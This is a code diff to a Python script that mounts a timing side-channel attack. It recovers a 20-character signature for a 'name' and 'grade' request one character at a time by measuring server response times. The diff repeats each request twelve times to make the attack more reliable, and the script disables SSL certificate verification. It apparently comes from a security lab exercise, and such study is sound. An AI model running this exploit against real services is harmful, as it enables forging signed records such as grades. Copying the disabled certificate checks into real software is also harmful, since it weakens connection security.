@@ -18,8 +18,9 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 def http_request_time(URL, params):
     # Disables SSL verification since we don't have a valid certificate.
     r = requests.get(URL, params, verify=False)
-    print(r.elapsed.total_seconds())
-    return r.elapsed.total_seconds()
+    time = r.elapsed.total_seconds()
+    print(time)
+    return time
 
 
 def generate_chars():
@@ -35,14 +36,17 @@ def generate_signature(name, grade):
     signature = ""
     possible_chars = generate_chars()
     params = {'name': name, 'grade': grade, 'signature': signature}
+    iterations = 12
     for i in range(20):  # Signature is 20 chars long.
         max_time = 0.0
         subject_char = ''
         for char in possible_chars:
             temp = signature + char
             params['signature'] = temp
-
-            current_time = min([http_request_time(URL, params) for i in range(1)])
+            request_times = []
+            for i in range(iterations): 
+                request_times.append(http_request_time(URL, params))
+            current_time = min(request_times)
 
             if current_time > max_time:
                 max_time = current_time
